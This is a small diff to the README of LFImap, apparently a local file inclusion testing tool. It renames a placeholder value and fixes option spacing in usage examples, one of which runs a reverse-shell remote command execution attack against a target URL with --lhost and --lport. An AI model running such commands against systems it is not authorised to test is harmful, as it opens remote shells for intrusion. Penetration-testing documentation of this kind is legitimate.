@@ -123,13 +123,13 @@ OTHER:
 
 #### 2) Post argument testing with '-D'
 
-`python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`
+`python3 lfimap.py -U "http://IP/index.php" -D "page=testme" -a`
 
 ![LFIMAP_POST](https://github.com/hansmach1ne/LFImap/assets/57464251/ebd6b1a4-8990-4a36-b321-871fe9271313)
 
 
 #### 3) Reverse shell remote command execution attack with '-x'
-`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a-x --lhost <IP> --lport <PORT>`  
+`python3 lfimap.py -U "http://IP/vuln.php?param=testme" -C "PHPSESSID=XXXXXXXX" -a -x --lhost <IP> --lport <PORT>`  
 
 ![LFIMAP_revshell](https://github.com/hansmach1ne/LFImap/assets/57464251/5d64244c-8a37-4019-bf2f-8fa7eb6bfd69)
 
